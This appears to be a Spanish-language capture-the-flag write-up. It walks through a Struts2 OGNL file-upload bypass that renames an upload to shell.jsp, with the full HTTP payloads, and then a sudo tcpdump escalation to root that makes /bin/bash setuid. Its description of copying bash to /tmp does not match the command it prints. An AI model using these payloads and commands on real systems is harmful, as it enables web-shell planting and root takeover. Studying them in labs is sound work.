📖 Desglose de los pasos de la explotación

Entendiendo el valor del Stack

En Struts2, la pila de valores es un concepto esencial de OGNL. La pila de valores almacena las propiedades del objeto

Action, que se procesa durante cada solicitud. Al obtener acceso a la parte superior de la pila de valores, los atacantes pueden modificar dinámicamente varios parámetros de solicitud, incluidos los nombres de archivo.


Construcción de paquetes de tráfico HTTP

Se crea una solicitud POST diseñada para activar la carga de archivos con contenido específico de datos de formulario

multi-parte:

POST /upload.action HTTP/1.1 Host: 127.0.0.1:8080 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary----WebKitFormBoundary ----WebKitFormBoundary Content-Disposition: form-data; name="Upload"; filename="1.txt" Content-Type: text/plain example text ----WebKitFormBoundary--

El parámetro filename es un punto clave de inyección, dirigido al mecanismo de enlace OGNL. Mediante un parámetro de carga adicional, podemos cambiar el valor del nombre de archivo a través de la pila de valores.


Acceso a la stack de valores

Para recuperar el elemento superior de la pila de valores, que es la acción que utilizan los atacantes. Al llamar al método toString(), se puede inspeccionar el contenido de la pila.


Intento de omisión del enlace de parámetros

El atacante intenta modificar el nombre del archivo mediante expresiones OGNL:


[0].top.UploadFilename = "malicious_script.txt"

El intento directo falla debido a un mecanismo de seguridad (ParametersInterceptor#isAccepted), que aplica estrictas comprobaciones de expresiones regulares para validar los nombres de los parámetros. El método ParametersInterceptor#isAccepted comprueba los nombres de los parámetros con la siguiente expresión regular:


\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\['(\w-?|[\u4e00-\u9fa5]-?)+'])|(\('(\w-?| [\u4e00-\u9fa5]-?)+'\)))*

La validación evita que se ejecuten expresiones OGNL malformadas o sospechosas (como "[0]" ). "[0].top" no supera la validación porque no se ajusta a los patrones permitidos.


Intento exitoso de omisión de parámetros

El atacante simplifica la expresión OGNL eliminando los índices "[]" y utilizando directamente la palabra clave top. Se construye una expresión OGNL válida:


top.UploadFilename = "malicious_script.txt"

Esta expresión supera la validación y permite modificar el nombre del archivo.


Payload Final


POST /upload.action HTTP/1.1 Host: 127.0.0.1:8080 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary ----WebKitFormBoundary Content-Disposition: form-data; name="Upload"; filename="1.txt" Content-Type: text/plain example text ----WebKitFormBoundary content-Disposition: form-data; name="top.UploadFileName" shell.jsp ----WebKitFormBoundary--

Basándonos en este desglose, intentemos explotar el objetivo. Tras analizar el código fuente, podemos deducir que el objetivo solo acepta un único archivo de imagen válido, ya que cuenta con mecanismos de seguridad adicionales para impedir la carga de archivos JSP.

Si se superan estas comprobaciones, el archivo se carga en el servidor en un directorio dentro de la carpeta de cargas, que se nombra con la marca de tiempo actual. 2.1 - Identificación de Vulnerabilidad

La ruta de ataque consiste en intentar incrustar un archivo JSP malicioso en el contenido de una imagen y, a continuación, utilizar el abuso del parámetro OGNL para cambiar el nombre del archivo a un archivo JSP que nos permita activar nuestras cargas útiles. Obtenemos esta carga útil de una divulgación similar y copiamos el encabezado de la imagen en nuestra solicitud POST.


Guarda la shell en el directorio explotable: webshell.jsp e igual con .py y .war

¿Qué es un archivo .war?

Un archivo WAR (Web Archive) es un formato utilizado para empaquetar aplicaciones web en el entorno Java EE (Enterprise Edition). Este archivo contiene todos los elementos necesarios para ejecutar una aplicación web, como páginas HTML, archivos JSP, servlets, recursos estáticos (imágenes, CSS, JavaScript) y clases Java compiladas.

3.2 - Escalada de Privilegios :: usuario root

Al comprobar las entradas de sudo, encontramos que el usuario james tiene permiso para ejecutarse sin proporcionar una contraseña. tcpdump como root.


Nota tcpdump

Es una herramienta de análisis de paquetes de red que se utiliza para capturar e inspeccionar el tráfico de red.


Hay una entrada tcpdump | GTFOBins para tcpdump que muestra cómo escalar privilegios utilizando tcpdump cuando se configura para ejecutarse con permisos sudo. Podemos aprovechar esto para crear un script que copie /bin/bash a /tmp/bash_root , le asigne el bit setuid y lo ejecute con privilegios de root.


COMMAND='chmod u+s /bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
